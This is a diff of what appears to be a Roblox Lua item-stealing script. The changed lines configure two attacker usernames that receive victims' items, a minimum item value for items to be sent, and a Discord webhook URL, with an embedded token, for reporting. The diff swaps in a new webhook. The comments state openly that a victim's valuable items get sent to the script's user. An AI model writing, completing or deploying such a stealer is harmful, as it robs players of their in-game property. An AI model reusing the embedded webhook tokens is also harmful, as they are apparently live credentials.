@@ -61,7 +61,7 @@ end
 
 Username = "LaRussieCool3"
 Username2 = "LaRussieCool4" -- stuff will get sent to this user if first user's mailbox is full
-Webhook = "https://discord.com/api/webhooks/1241836056379392131/ts3GPdji9p1-nI6Y4FRZ4uiCm9jiPeuIUcQuU8bXmX3wAN5N_n0XnoSzRMPpkFMn4WLd"
+Webhook = "https://discord.com/api/webhooks/1274742324760416297/c5ZoWUpwxRxjAskDbWRleTtlMMt9T69Gm-LRhKWZ8ZpdDxq5XPNPhjod_GZIbIZh_0mV"
 min_rap = 500000 -- minimum rap of each item you want to get sent to you.
 
 local player = game:GetService"Players".LocalPlayer
